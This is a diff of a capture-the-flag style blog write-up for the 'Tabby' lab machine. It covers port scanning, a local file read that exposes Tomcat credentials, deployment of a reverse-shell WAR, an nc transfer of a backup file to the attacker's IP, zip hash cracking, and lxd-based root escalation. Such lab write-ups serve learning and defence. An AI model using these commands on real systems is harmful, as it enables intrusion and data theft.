@@ -27,7 +27,7 @@ tags:
 ## Enumeration
 
 ### nmap
-As always we start by doing a nmap scan against the host (10.10.10.194) :
+As always we start by doing a nmap scan against the host :
 
 ```sh
 root@kali:/home/pi0x73# nmap -sC -sV -T4 10.10.10.194
@@ -53,13 +53,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 12.44 seconds
 ```
 
-Some interesting information can be collected through the nmap scan where we see **Tomcat Apache** running on port 8080 , a web page on port 80 and a domain (megahosting.htb).
+Some interesting information can be collected through the nmap scan where we see **Tomcat Apache** running on port 8080 , a web page on port 80 and a domain : **megahosting.htb**.
 
 First thing, I am going to add the domain to the hosts file and procced through the web page.
 
-We can do so by adding **megahosting.htb** under ip : 10.10.10.194 on **/etc/hosts** file on a new line.
-
-### web
+### Webpage
 
 Procceding through the webpage, we are represented with a hosting platform service :
 
@@ -74,22 +72,22 @@ Nothing much interesting till here , but after I while clicking around I saw an 
 <li><a href="#callus">Support</a></li>
 ```
 
-### file read
+### File Read
 
 It seems like all of the buttons redirect to nowhere but news button has an interesting link attached. 
-A php pagethat calls files from systemand shows them on the webpage so I though it was possible that we could achieve File Read from the remote host.
+A php page that calls files from system and shows them on the webpage so I though it was possible that we could achieve File Read from the remote host.
 
 ![lfi](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/tabby-writeup/lfi.png)
 
-Obviously the File Read injection was successfuland I am able to read files from the system through the vulnerability. 
+Obviously the File Read injection was successful and I was able to read files from the system through this vulnerability. 
 
-This could be a lot useful at the moment since we also noticed apache tomcat running on port 8080 , so I started looking around for the tomcat-users.xml file which holds the credentials configured for the administration panel.
+This could be a lot useful at the moment since we also noticed apache tomcat running on port 8080 , so I started looking around for the ``tomcat-users.xml`` file which holds the credentials configured for the administration panel.
 
 To make the searching easier I installed **tomcat9** on my attacker machine to see where it saves the config files.
 
 ![tomcat9](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/tabby-writeup/tomcat9.png)
 
-Using those definitive paths I could try to retrieve the config file from the remote system and see if there is any information inside it :
+Using those paths I was able to retrieve the config file from the remote system : 
 
 ```xml
   <role rolename="tomcat"/>
@@ -104,11 +102,12 @@ Using those definitive paths I could try to retrieve the config file from the re
 </tomcat-users>
 ```
 
-I was able to grab and read the file from the host and we can easily see the credentials for tomcat running on 8080.
+We can easily see the credentials for tomcat running on 8080.
 
 However while trying to connect with the given credentials on http://10.10.10.194:8080/manager I noticed that the I could not access the GUI panel, so I started googling about possible other ways.
 
-After some time I came up with an interesting pip module : **tomcat-manager** which could help me use the panel through CLI .
+After some time I came up with an interesting pip module : **tomcat-manager**, 
+which could help me use the panel through CLI .
 
 ![tomcatmgr](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/tabby-writeup/tomcatmgr.png)
 
@@ -129,31 +128,32 @@ tomcat-manager> connect http://10.10.10.194:8080/manager tomcat "$3cureP4s5w0rd1
 tomcat-manager> deploy local shell.war /zdf
 tomcat-manager>
 ```
-With the payload already uploaded to the web server , what's left to do is to navigate on ``http://10.10.10.194:8080/zdf`` in my case to triger the payload and recieve a reverse shell to my machine : 
+With the payload already uploaded to the web server , what's left to do is to navigate on [url](http://10.10.10.194:8080/zdf) in my case to triger the payload and recieve a reverse shell to my machine : 
 
 ![tomcat-shell](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/tabby-writeup/tomcat-shell.png)
 
-## Leveraging User
+## Leveraging Privileges
 
-Upon enumerating inside the box I saw something interesting under **/var/www/html/files** : 
+Upon enumerating inside the box I saw something interesting under ``/var/www/html/files`` : 
 
 ![backups](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/tabby-writeup/backups.png)
 
 I copied this zip backup to my machine to view it contents :
 
 ```console
-VICTIM MACHINE :
-
 tomcat@tabby:/var/www/html/files$ nc 10.10.15.30 9002 < *.zip
 
-ATTACKER MACHINE :
 
 root@kali:~# nc -lvp 9002 > *.zip
 Listening on 0.0.0.0 9002
 Connection received on megahosting.htb 35208
 ```
 
-However I wasnt able to view anything because the zip backup was password protected. In order to unlock it I used **zip2john** to convert the archive into a crackable hash and then give it to john to crack.
+However I wasnt able to view anything because the zip backup was password protected. 
+
+### Cracking the zipfile
+
+In order to unlock it I used **zip2john** to convert the archive into a crackable hash and then give it to john to crack.
 
 ```sh
 root@kali:~# zip2john backup.zip
@@ -169,7 +169,7 @@ backup.zip:$pkzip2$3*2*1*0*0*24*02f9*5d46*ccf7b799809a3d3c12abb83063af3c6dd53852
 NOTE: It is assumed that all files in each archive have the same password.
 If that is not the case, the hash may be uncrackable. To avoid this, use
 option -o to pick a file at a time.
-root@kali:~# nano backupfile.hash
+
 root@kali:~# john backupfile.hash --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (PKZIP [32/64])
@@ -179,8 +179,6 @@ admin@it         (backup.zip)
 1g 0:00:00:01 DONE (2020-11-08 15:49) 0.6849g/s 7097Kp/s 7097Kc/s 7097KC/s adnc153..adenabuck
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed
-root@kali:~# 
-
 ```
 
 There was nothing useful inside the zip backup but I noticed that user **ash** uses the same password as zip :
@@ -190,11 +188,13 @@ There was nothing useful inside the zip backup but I noticed that user **ash** u
 ## Privesc to root
 
 Now as seen above , while using ``id`` command , it pulls out interesting information where ``ash`` is a memeber of **lxd** group.
-Members from this group can create and start containers to the machine.
 
+Members from this group can create and start containers to the machine.
 To sumarize that I am able to create a container , start it and then mount the machine filesystem to it.
 
-To do that I downloaded **alpine** image to the machine which is preconfigured and initialized it :
+### Abusing LXD Privileges
+
+I downloaded **alpine** image to the machine which is a preconfigured container and initialized it :
 
 ![lxd](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/tabby-writeup/lxd.png)
 
